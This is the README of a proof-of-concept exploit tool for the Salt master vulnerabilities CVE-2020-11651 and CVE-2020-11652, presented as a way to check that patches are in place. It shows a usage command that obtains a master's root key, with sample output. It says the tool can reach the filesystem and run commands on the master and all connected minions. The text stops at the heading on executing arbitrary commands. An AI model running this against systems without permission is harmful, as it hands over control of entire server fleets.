# PoC exploit for CVE-2020-11651 and CVE-2020-11652

This is a proof of concept exploit based on the initial [check script](https://github.com/rossengeorgiev/salt-security-backports). Use it to verify you have successfully updated your Salt master servers to a [release containing the required fixes](https://www.vmware.com/products/aria-automation.html).

Thanks for F-Secure Labs for their [research and reporting](https://blog.f-secure.com/category/threats-research/).

Currently this script can be used for filesystem access and scheduling commands on the master and all connected minions. Use these powers wisely!

# Usage
Default operation (without arguments) is to obtain the root key for the given master:
```
root@kalimah:~/salt# python3 exploit.py --master 192.168.115.130
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Salt version: 3000.1
[ ] This version of salt is vulnerable! Check results below
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...

```

Executing arbitrary commands on the master:
